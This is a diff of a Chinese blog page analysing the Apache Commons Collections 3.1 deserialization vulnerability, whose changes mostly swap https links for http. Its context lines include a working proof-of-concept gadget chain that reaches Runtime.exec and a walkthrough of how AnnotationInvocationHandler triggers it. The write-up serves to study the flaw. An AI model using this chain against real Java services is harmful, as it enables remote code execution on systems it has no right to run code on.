@@ -145,7 +145,7 @@
 <meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496942.jpg">
 <meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496953.jpg">
 <meta property="og:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496963.jpg">
-<meta property="og:updated_time" content="2020-03-19T08:29:31.417Z">
+<meta property="og:updated_time" content="2020-03-19T11:16:35.017Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Java入坑：Apache-Commons-Collections-3.1 反序列化漏洞分析">
 <meta name="twitter:image" content="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496782.jpg">
@@ -179,7 +179,7 @@
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
+      hm.src = "http://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
       var s = document.getElementsByTagName("script")[0];
       s.parentNode.insertBefore(hm, s);
     })();
@@ -474,7 +474,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2020-03-19 16:29:31" itemprop="dateModified" datetime="2020-03-19T16:29:31+08:00">2020-03-19</time>
+                <time title="Modified: 2020-03-19 19:16:35" itemprop="dateModified" datetime="2020-03-19T19:16:35+08:00">2020-03-19</time>
               
             
           </span>
@@ -537,7 +537,7 @@
       
         <hr>
 <a id="more"></a>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>组件下载：<br><a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>组件下载：<br><a href="http://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">http://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p>
 <p>Idea 新建项目-&gt;选择jdk1.7—&gt;选择File &gt; project structure &gt; Modules &gt; dependencies &gt; + JARS or directories -&gt;加载下载的组件</p>
 <p><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496782.jpg" alt=""></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>poc:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvalObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"open /Applications/Calculator.app/"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChain</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        onlyElement.setValue(<span class="string">"foobar"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
@@ -572,7 +572,7 @@
 <p>虽然找到了一个能自动调用<code>transform</code>的过程，但是要实现反序列化命令执行，还需要有对map的操作。这里还有另外一处也有调用<code>transform</code>方法的功能：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 168行</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>在其父类<code>/org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.java</code>中实现了一个静态类的定义：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 180行</span></span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            value = parent.checkSetValue(value); <span class="comment">// 调用点</span></span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
 <blockquote>
-<p>这里用了java类的嵌套，和php语言特性有点区别：<a href="https://blog.csdn.net/hguisu/article/details/7270086" target="_blank" rel="noopener">https://blog.csdn.net/hguisu/article/details/7270086</a></p>
+<p>这里用了java类的嵌套，和php语言特性有点区别：<a href="http://blog.csdn.net/hguisu/article/details/7270086" target="_blank" rel="noopener">http://blog.csdn.net/hguisu/article/details/7270086</a></p>
 </blockquote>
 <h3 id="step3-寻找重写readObject"><a href="#step3-寻找重写readObject" class="headerlink" title="step3: 寻找重写readObject"></a>step3: 寻找重写<code>readObject</code></h3><p>在jdk小于等于1.7的时，<code>/sun/reflect/annotation/AnnotationInvocationHandler.class</code>中的<code>readObject</code>中有对map的修改功能。<br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496903.jpg" alt="-w1052"></p>
 <p>这里便于分析，用<code>jd-gui</code>将其jar包逆向：<br><code>/Library/Java/JavaVirtualMachines/jdk1.7.0_80.jdk/Contents/Home/jre/lib/rt.jar</code><br><img src="http://static-passer6y.d0g3.cn/0day/2020-03-19-15846065496915.jpg" alt="-w1435"><br>这里<code>readObject</code>方法，使用了<code>entry.setValue</code>方法。</p>
@@ -596,9 +596,9 @@
 <p>此外，简单学习了一些java语法后就开始分析漏洞，很多java语法特性以及概念不太熟悉，比如反射、嵌套类、JMX、JNDI等等，接下来打算好好弥补一下这方面的短板。</p>
 <p>参考：</p>
 <ul>
-<li><a href="https://www.xmanblog.net/java-deserialize-apache-commons-collections/" target="_blank" rel="noopener">https://www.xmanblog.net/java-deserialize-apache-commons-collections/</a></li>
-<li><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></li>
-<li><a href="https://xz.aliyun.com/t/4711" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711</a></li>
+<li><a href="http://www.xmanblog.net/java-deserialize-apache-commons-collections/" target="_blank" rel="noopener">http://www.xmanblog.net/java-deserialize-apache-commons-collections/</a></li>
+<li><a href="http://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">http://xz.aliyun.com/t/4558#toc-0</a></li>
+<li><a href="http://xz.aliyun.com/t/4711" target="_blank" rel="noopener">http://xz.aliyun.com/t/4711</a></li>
 </ul>
 
       
@@ -824,7 +824,7 @@
             <div class="links-of-author motion-element">
               
                 <span class="links-of-author-item">
-                  <a href="https://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="http://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                   
                 </span>
               
@@ -849,7 +849,7 @@
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
+                    <a href="http://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -857,19 +857,19 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
+                    <a href="http://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
+                    <a href="http://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
+                    <a href="http://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
+                    <a href="http://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -877,11 +877,11 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
+                    <a href="http://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
+                    <a href="http://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
                   </li>
                 
               </ul>
